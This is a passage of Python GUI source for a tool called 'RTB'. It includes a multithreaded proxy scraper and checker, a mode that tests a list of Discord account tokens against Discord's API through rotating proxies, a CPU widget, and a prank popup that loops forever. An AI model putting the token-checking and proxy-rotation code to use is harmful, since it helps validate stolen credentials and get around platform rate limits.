        global working
        global dead
        working = 0
        dead = 0
        checking = True
        if not os.path.isdir("proxies"):
            os.mkdir("proxies")
        proxylist = open(list).read().splitlines()
        with ThreadPoolExecutor(max_workers=threads) as exe:
            for proxy in proxylist:
                exe.submit(check_proxy, proxy, timeout, list, proxy_type)
        checking = False
        printqueue.append(f"Working: {working} | Dead: {dead}")

    layout = [
        [sg.Output(size=(105, 20))],
        [sg.Button("Scrape Proxies", size=(15,1), key="ScrapeButton"), sg.Input(key="ProxyListPath"), sg.FileBrowse(file_types=(("Text Files", "*.txt"),("All Files", "*.*")), key="Brow"), sg.Button("Check", key="Checkbutton"), sg.Combo(['https', 'http', 'socks4', 'socks5'], key="Type", readonly=True), sg.Text("Timeout (In Seconds):"), sg.Spin([x + 1 for x in range(500)], 10, key='TimeOut')]
    ]
    window = sg.Window("RTB | Proxy Scraper/Checker", resizable=False, auto_size_buttons=True, icon=rtb_icon).Layout(layout)
    while True:
        event, values = window.Read(timeout=50)
        if event is None:
            os.kill(os.getpid(), 9)
        elif event == sg.TIMEOUT_KEY:
            for p in printqueue:
                print(p)
                printqueue.remove(p)
            if scraping:
                window.TKroot.title(f'RTB | Proxy Scraper/Checker [Scraping {finished}/{len(links)}, {len(proxies)} proxies total.]')
                window['ScrapeButton'].Update(disabled=True)
                window['Checkbutton'].Update(disabled=True)
                window['ProxyListPath'].Update(disabled=True)
                window['Brow'].Update(disabled=True)
                window['Type'].Update(disabled=True)
            elif checking:
                window.TKroot.title(f'RTB | Proxy Scraper/Checker [Working: {working} | Dead: {dead} | Total: {len(proxylist)}]')
                window['ScrapeButton'].Update(disabled=True)
                window['Checkbutton'].Update(disabled=True)
                window['ProxyListPath'].Update(disabled=True)
                window['Brow'].Update(disabled=True)
                window['Type'].Update(disabled=True)
            else:
                window.TKroot.title(f'RTB | Proxy Scraper/Checker')
                window['ScrapeButton'].Update(disabled=False)
                window['Checkbutton'].Update(disabled=False)
                window['ProxyListPath'].Update(disabled=False)
                window['Brow'].Update(disabled=False)
                window['Type'].Update(disabled=False)
        elif event == "ScrapeButton":
            scraping = True
            t = threading.Thread(target=scrape_proxies, daemon=True)
            t.start()
        elif event == "Checkbutton":
            while True:
                thr = sg.PopupGetText("Number of Threads? (Default: 500)", title="Threads")
                if thr == "":
                    thr = 500
                if thr is None:
                    break
                try:
                    thr = int(thr)
                except:
                    sg.Popup("Not a Number.")
                else:
                    try:
                        t = threading.Thread(target=check_proxies, args=[values['TimeOut'], values['ProxyListPath'], thr, values['Type']], daemon=True)
                        t.start()
                        checking = True
                    except Exception:
                        pass
                    break

elif mode == "TokenNames":
    printqueue = list()
    def check_name(token):
        headers, proxies = setup_request(token)
        request = requests.Session()
        while True:
            try:
                src = request.get('https://'+endpoint+'discord.com/api/v8/users/@me', headers=headers, proxies=proxies, timeout=10)
            except Exception:
                if use_proxies == 1:
                    proxies = request_new_proxy()
                else:
                    break
            else:
                break
        if src.status_code == 401:
            pass
        else:
            try:
                printqueue.append(f"{src.json()['username']}#{src.json()['discriminator']} ({token})")
            except:
                pass

    layout = [
        [sg.Output(size=(100,30))]
    ]
    for token in tokenlist:
        executor.submit(check_name, token)
    window = sg.Window(f'RTB | Token Names', layout, keep_on_top=True, icon=rtb_icon)
    while True:
        event, values = window.Read(timeout=10)
        if event is None:
            sys.exit()
        elif event == sg.TIMEOUT_KEY:
            for p in printqueue:
                print(p)
                printqueue.remove(p)

elif mode == "CPUWIDGET":
    # Thank you PySimpleGUI, Very Cool!
    import psutil
    layout = [
        [sg.Text('')],
        [sg.Text('', size=(8, 2), font=('Helvetica', 20), justification='center', key='text')],
        [sg.Exit(pad=((15, 0), 0)), sg.Spin([x + 1 for x in range(10)], 1, key='spin')]
    ]
    window = sg.Window('Running Timer', layout, no_titlebar=True, auto_size_buttons=False, keep_on_top=True,
                       grab_anywhere=True, icon=rtb_icon)
    while True:
        event, values = window.Read(timeout=10)
        if event is None or event == 'Exit':
            break
        try:
            interval = int(values['spin'])
        except:
            interval = 1
        cpu_percent = psutil.cpu_percent(interval=interval)
        window.Element('text').Update(f'CPU {cpu_percent:02.0f}%')

elif mode == 'ree':
    picdata = requests.get("https://gist.githubusercontent.com/DeadBread76/3d93e55fe4a9e4c7324c2f0b13cf24ac/raw/7d433bb5187c5d2c1fc74c310ff0638790491c87/Special%2520surprise.txt")
    pic = picdata.content
    while True:
        try:
            sg.PopupAnimated(pic, background_color='black', time_between_frames=40)
        except Exception:
            pass
